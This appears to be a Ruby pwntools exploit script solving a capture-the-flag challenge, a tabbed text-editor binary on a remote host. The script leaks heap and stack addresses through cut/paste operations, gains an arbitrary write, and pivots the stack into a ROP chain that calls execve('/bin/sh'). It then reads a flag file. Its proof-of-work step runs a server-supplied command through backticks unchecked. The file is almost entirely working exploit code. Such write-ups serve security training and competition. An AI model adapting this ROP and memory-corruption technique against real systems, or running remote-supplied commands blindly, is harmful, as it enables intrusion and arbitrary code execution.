#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '13.230.132.4', 21700
@local = false
@p = ''
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  $z = Tubes::Process.new('./run.sh')
else
  raise ArgumentError, 'host not set' if host.empty?
  $z = Sock.new(host, port)
end
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6'); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pow
  z.gets "token of:\n"
  cmd = z.gets.strip
  p cmd
  res = `#{cmd}`.strip
  puts res
  z.puts res
end

pow if !@local

def pt; z.gets '>>> '; end
def done
  z.gets 'Done.'
end

def insert(cur, data)
  pt
  fail if data =~ /\s/
  z.puts "i #{cur} #{data.chars.map{|c|"\x16#{c}"}.join}"
  done
end

def new
  pt
  z.puts 'n'
  z.gets 'Switched to new tab '
  z.gets.to_i
end

def select(idx)
  pt
  z.puts "s #{idx}"
  z.gets 'Switched'
end

def cut(cur, len)
  pt
  z.puts "c #{cur} #{len}"
  done
end

def paste(idx)
  pt
  z.puts "p #{idx}"
  done
end

def display(cur, len)
  pt
  z.puts "d #{cur} #{len}"
end

def replace(cur, len, chr)
  fail if chr =~ /\s/
  pt
  z.puts "r #{cur} #{len} \x16#{chr}"
  done
end

insert(0, 'A' * 24)
cut(0, 24)

t1 = new
ret = 0x44aadd
rop = flat(
  [ret] * 3,
  0x0000000000411583, # pop rsi ; ret
  0x00000000006d70e0, # @ .data
  0x000000000044aadc, # pop rax ; ret
  "/bin/sh\x00",
  0x0000000000489731, # mov qword ptr [rsi], rax ; ret
  0x0000000000411583, # pop rsi ; ret
  0x00000000006d70e8, # @ .data + 8
  0x000000000044aadc, # pop rax ; ret
  0x00000000006d70e0 + 5, # @ .data + 5
  0x0000000000489731, # mov qword ptr [rsi], rax ; ret
  0x0000000000411583, # pop rsi ; ret
  0x00000000006d70f0, # @ .data + 16
  0x0000000000445e70, # xor rax, rax ; ret
  0x0000000000489731, # mov qword ptr [rsi], rax ; ret
  0x00000000004006a6, # pop rdi ; ret
  0x00000000006d70e0, # @ .data
  0x0000000000411583, # pop rsi ; ret
  0x00000000006d70e8, # @ .data + 8
  0x000000000044ab35, # pop rdx ; ret
  0x00000000006d70f0, # @ .data + 16
  0x000000000044aadc, # pop rax ; ret
  59,
  0x000000000047f125, # syscall ; ret
)
# debug!
insert(0, rop.ljust(248, 'B'))
cut(0,200-16)
select(0)
paste(0)
display(0, 100)
z.gets('A' * 24)
z.readn(8 * 7)
heap = z.readn(8).u64
log.dump heap.hex

stack_at = 0x6d9ec8
replace(64 + 8, 1, 0.chr) # dirty = false
p64(stack_at).chars.each_with_index do |c, i|
  replace(64 + 16 + i, 1, c)
end

select(1)
display(0, 8)
z.gets # echo mode
stack = z.readn(8).u64
log.dump stack.hex

select(0)
ret_at = stack - 0x130
p64(ret_at).chars.each_with_index do |c, i|
  replace(64 + 16 + i, 1, c)
end

select(1)
pop_rsp = 0x0000000000403073 # : pop rsp ; ret
flat(pop_rsp, heap + 16).chars.each_with_index do |c, i|
  replace(i, 1, c)
end
# select(0)
# debug!
# display(0, 180)
pt
z.puts 'q'
log.info 'shell!'
z.puts 'id'
z.puts 'cat /home/poe/flag1'

z.interact
